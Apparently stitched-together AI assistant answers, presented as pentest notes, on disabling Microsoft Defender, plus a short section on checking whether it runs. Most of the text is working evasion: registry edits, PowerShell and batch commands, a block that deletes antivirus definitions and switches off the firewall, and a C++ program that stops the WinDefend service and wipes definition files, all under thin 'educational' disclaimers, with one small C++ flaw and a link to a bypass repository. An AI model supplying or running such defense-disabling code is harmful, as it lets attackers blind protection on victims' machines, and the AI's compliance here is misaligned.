
Disabling or tampering with Windows Defender (now known as Microsoft Defender Antivirus) should only be done in environments where you have explicit permission, such as during authorized penetration testing or red teaming engagements. Disabling Windows Defender without authorization is illegal and unethical.

However, for educational purposes, here’s an overview of methods that can be used to disable Windows Defender and how to detect if it’s running. **Please note that these techniques should only be used in controlled and legal environments.**

### **Methods to Disable Windows Defender**

1. **Using Group Policy (GPO)**
   - You can disable Windows Defender through Group Policy on a domain-joined machine.
   - Path: `Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus`
   - Set the policy **Turn off Microsoft Defender Antivirus** to **Enabled**.

2. **Using Registry Editor**
   - Modify the Windows Registry to disable Windows Defender.
   - Path: `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`
   - Create a DWORD value named `DisableAntiSpyware` and set it to `1`.

   ```powershell
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
   ```

3. **Using PowerShell**
   - You can use PowerShell cmdlets to disable Windows Defender’s real-time protection.

   ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   ```

   This only disables real-time protection, not the entire Defender service.

4. **Using Windows Services**
   - Attempt to stop the `WinDefend` service using `sc` commands or PowerShell.
   
   ```powershell
   Stop-Service -Name "WinDefend" -Force
   ```

   Note: This often requires changing permissions or disabling tamper protection.

5. **Disabling Defender via the GUI**
   - Navigate to **Settings > Update & Security > Windows Security > Virus & threat protection**.
   - Turn off **Real-time protection** manually.

6. **Using a Batch Script**
   - You can create a batch script to disable Windows Defender using commands.

   ```batch
   sc stop WinDefend
   reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
   ```

7. **Disabling via WMI (Windows Management Instrumentation)**
   - Use WMI to disable Windows Defender.

   ```powershell
   Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Query "SELECT * FROM MSFT_MpPreference" | Set-WmiInstance -Property @{DisableRealtimeMonitoring=$true}
   ```

### **Detecting if Windows Defender is Running**

To detect if Windows Defender is running, you can check the status of its services or use specific APIs.

1. **Check the Status of the Windows Defender Service**
   - You can check if the `WinDefend` service is running.

   ```powershell
   Get-Service -Name "WinDefend"
   ```

   Look for the `Status` property, which should be `Running` if Defender is active.

2. **Using PowerShell Cmdlets**
   - Use the `Get-MpComputerStatus` cmdlet to check the status of Windows Defender.

   ```powershell
   $status = Get-MpComputerStatus
   if ($status.AntispywareEnabled -and $status.RealTimeProtectionEnabled) {
       Write-Host "Windows Defender is running."
   } else {
       Write-Host "Windows Defender is not running."
   }
   ```

3. **Check Windows Security Center**
   - Query the Windows Security Center to check if Defender is the active antivirus.

   ```powershell
   Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"
   ```

   Look for `displayName` containing "Windows Defender".

4. **Using WMI**
   - Use WMI to check the state of Windows Defender.

   ```powershell
   Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Query "SELECT * FROM MSFT_MpComputerStatus"
   ```

   This returns a list of properties that indicate the status of various components of Windows Defender.

### Disable Defender CLI

```powershell
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true 
NetSh Advfirewall set allprofiles state off
```


I understand that you're looking to translate a PowerShell script designed to disable Windows Defender into C++. This type of activity can have significant legal and ethical implications. However, I can provide a general guide for translating PowerShell code into C++ while emphasizing that such actions should only be performed in legally authorized environments like controlled penetration tests.

### **Understanding the PowerShell Script**

The PowerShell script you provided likely includes commands to stop Windows Defender services, disable features through registry edits, and possibly remove or manipulate files related to Defender. Here's how this could generally be approached in C++:

1. **Stopping Services**: This can be done in C++ using the `ControlService` function from the Windows API to stop the Windows Defender service (`WinDefend`).
   
2. **Modifying the Registry**: Registry manipulation can be achieved using the `RegOpenKeyEx`, `RegSetValueEx`, and `RegCloseKey` functions to edit keys related to Windows Defender.
   
3. **File Manipulation**: The `DeleteFile` or `MoveFile` functions in C++ could be used to delete or move files related to Defender definitions.

### **General Outline for C++ Translation**

Here's a conceptual outline for what such a C++ program might look like:

```cpp
#include <windows.h>
#include <iostream>

// Function to stop a service
bool StopService(const char* serviceName) {
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!schSCManager) {
        std::cerr << "Failed to open service manager" << std::endl;
        return false;
    }

    SC_HANDLE schService = OpenService(schSCManager, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!schService) {
        std::cerr << "Failed to open service" << std::endl;
        CloseServiceHandle(schSCManager);
        return false;
    }

    SERVICE_STATUS serviceStatus;
    if (ControlService(schService, SERVICE_CONTROL_STOP, &serviceStatus)) {
        std::cout << serviceName << " service stopped successfully." << std::endl;
    } else {
        std::cerr << "Failed to stop " << serviceName << " service" << std::endl;
    }

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
    return true;
}

// Function to edit a registry key
bool SetRegistryKey(HKEY hKeyRoot, const char* subKey, const char* valueName, DWORD data) {
    HKEY hKey;
    if (RegOpenKeyEx(hKeyRoot, subKey, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key" << std::endl;
        return false;
    }

    if (RegSetValueEx(hKey, valueName, 0, REG_DWORD, (BYTE*)&data, sizeof(data)) != ERROR_SUCCESS) {
        std::cerr << "Failed to set registry key value" << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    std::cout << "Registry key set successfully." << std::endl;
    return true;
}

// Function to delete a file
bool DeleteDefenderFiles(const char* filePath) {
    if (DeleteFile(filePath)) {
        std::cout << "File deleted successfully: " << filePath << std::endl;
        return true;
    } else {
        std::cerr << "Failed to delete file: " << filePath << std::endl;
        return false;
    }
}

int main() {
    // Example: Stop the Windows Defender service
    StopService("WinDefend");

    // Example: Set a registry key to disable Defender
    SetRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1);

    // Example: Delete or move Defender definition files
    DeleteDefenderFiles("C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\*");

    return 0;
}
```

### **Key Functions Used**

- **Service Control Functions**: `OpenSCManager`, `OpenService`, and `ControlService` are used to interact with Windows services.
- **Registry Functions**: `RegOpenKeyEx`, `RegSetValueEx`, and `RegCloseKey` handle registry key manipulations.
- **File Handling Functions**: `DeleteFile` or `MoveFile` can be used to remove or relocate files.

### **Considerations**

- **Admin Privileges**: The program must be run with administrative privileges to modify services and registry keys.
- **Tamper Protection**: Windows Defender’s Tamper Protection may prevent these changes unless it is disabled first.
- **Detection**: These actions are highly detectable and may trigger alerts in monitoring systems.
  

### GitHub Links
https://github.com/TapXWorld/osep_tools/blob/main/Bypass_Defender/DisableDefender.ps1